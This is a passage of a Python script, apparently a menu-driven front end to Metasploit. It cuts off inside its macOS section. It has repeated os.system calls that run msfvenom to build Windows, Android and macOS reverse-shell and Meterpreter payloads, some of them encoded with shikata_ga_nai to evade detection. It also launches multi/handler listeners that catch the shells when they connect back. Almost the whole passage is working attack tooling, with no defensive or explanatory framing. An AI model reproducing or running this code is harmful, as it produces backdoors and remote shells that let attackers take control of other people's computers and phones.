[4]  Android
[5]  PHP
[6]  Python
[7]  Ruby
[8]  Java
[9]  Apple_ios

[00] Back

""")
  crpayget = str(input("\033[37m[\033[31m+\033[37m] Payload > "))
  if crpayget == "1":
    crwin()
  elif crpayget == "2":
    crosx()
  elif crpayget == "3":
    crlinux()
  elif crpayget == "4":
    crandro()
  elif crpayget == "5":
    crphp()
  elif crpayget == "6":
    crpython()
  elif crpayget == "7":
    crruby()
  elif crpayget == "8":
    crjava()
  elif crpayget == "9":
    crapple()
  elif crpayget == "00":
    menu()
  else:
    menu()


def crwin():
  start()
  pubip()
  slowprint(colors.green + """
[1]  windows/shell/reverse_tcp
[2]  windows/meterpreter/reverse_http
[3]  windows/meterpreter/reverse_https
[4]  windows/meterpreter/reverse_tcp
[5]  windows/meterpreter_reverse_http
[6]  windows/meterpreter_reverse_https
[7]  windows/meterpreter_reverse_tcp

[00] Back

""")
  winget = str(input("\033[37m[\033[31m+\033[37m] Win > "))
  if winget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red  + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ------------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/shell/reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      else:
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red +  "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "----------------- [+] Generating Payload [+] -----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/shell/reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()

  if winget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red +  "############################ Done ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_http"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ############################")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_http"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
  

  if winget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red + "########################## Done ##########################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_https"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_https"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()


  if winget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red + "########################## Done ##########################")
      print("\n")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter/reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()

  if winget == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red + "########################## Done ##########################")
      print("\n")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_http"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_http"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()


  if winget == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red + "########################## Done ##########################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_https"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_https"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()

  if winget == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    encwin = str(input("[+] Encode Your Windows Payload ( Y/N ) : "))
    if encwin == "Yes" or encwin == "yes" or encwin == "y" or encwin == "Y":
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red + "########################## Done ##########################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()
    else:
      slowprint2(colors.red + "########################## Starting ##########################")
      print("\n")
      slowprint(colors.green + "---------------- [+] Generating Payload [+] ----------------")
      print("\n")
      os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host,port,outp))
      slowprint2(colors.green + "---------------- [+] Payload Created Successfully [+] ----------------")
      print("\n")
      slowprint2(colors.red  + "############################ Done  ############################")
      print("\n")
      winlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
      if winlis == "Yes" or winlis == "yes" or winlis == "y" or winlis == "Y":
        pay = "windows/meterpreter_reverse_tcp"
        os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
        menu()
      else:
        slowprint2(colors.green + "########################## Done ##########################")
        print("\n")
        time.sleep(2)
        slowprint2(colors.red + "[+] Listner Failed [+] ")
        time.sleep(2)
        menu()

  else:
    time.sleep(2)
    menu()


def crandro():
  start()
  pubip()
  slowprint(colors.green + """ 
[1]  android/shell/reverse_http
[2]  android/shell/reverse_https
[3]  android/shell/reverse_tcp
[4]  android/meterpreter/reverse_http
[5]  android/meterpreter/reverse_https
[6]  android/meterpreter/reverse_tcp
[7]  android/meterpreter_reverse_http
[8]  android/meterpreter_reverse_https
[9]  android/meterpreter_reverse_tcp

[00] Back

""")
  crandroget = str(input("\033[37m[\033[31m+\033[37m] Android > "))
  if crandroget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/shell/reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/shell/reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crandroget == "2":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/shell/reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/shell/reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crandroget == "3":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/shell/reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/shell/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crandroget == "4":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter/reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crandroget == "5":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter/reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crandroget == "6":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter/reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  if crandroget == "7":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_http LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter_reverse_http"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crandroget == "8":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_https LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter_reverse_https"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()


  if crandroget == "9":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.red + "########################## Starting ##########################")
    print("\n")
    slowprint2(colors.red + "########################## Generating Payload ##########################")
    print("\n")
    os.system("sudo msfvenom --platform android -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} -o {2}.apk".format(host,port,outp))
    print("\n")
    slowprint2(colors.red + "########################## Payload Generating Success ##########################")
    print("\n")
    slowprint2(colors.green + "########################## Done ##########################")
    print("\n")
    androlis = str(input("\033[33m [+] Start a Listner (Y/N)  : "))
    if androlis == "Yes" or androlis == "yes" or androlis == "y" or androlis == "Y":
      print("\n")
      slowprint2(colors.green + "########################## Starting Listner ##########################")
      pay = "android/meterpreter_reverse_tcp"
      os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,pay))
      menu()
    else:
      print("\n")
      slowprint2(colors.red + "########################## Starting Listner Failed ##########################")
      menu()

  else:
    menu()


def crosx():
  start()
  pubip()
  slowprint(colors.green + """
[1]  osx/ppc/shell_reverse_tcp
[2]  osx/ppc/shell/reverse_tcp
[3]  osx/x64/meterpreter/reverse_tcp
[4]  osx/x64/meterpreter_reverse_http
[5]  osx/x64/meterpreter_reverse_https
[6]  osx/x64/meterpreter_reverse_tcp
[7]  osx/armle/execute/reverse_tcp
[8]  osx/armle/shell/reverse_tcp
[9]  osx/armle/shell_reverse_tcp

[00] Back

""")
  crosxget = str(input("\033[37m[\033[31m+\033[37m] Osx > "))
  if crosxget == "1":
    host = str(input("\033[37m[+] LHOST : "))
    port = str(input("\033[37m[+] LPORT : "))
    outp = str(input("\033[37m[+] OUTPUT NAME : "))
    print("\n")
    slowprint2(colors.green + "############################### Starting #######################################")
    print("\n")
    slowprint2(colors.red +   "########################## Generating Payload ##################################")
    print("\n")
    os.system("sudo msfvenom --platform osx -f macho -p osx/ppc/shell_reverse_tcp LHOST={0} LPORT={1} -o {2}.macho".format(host,port,outp))
    print("\n")
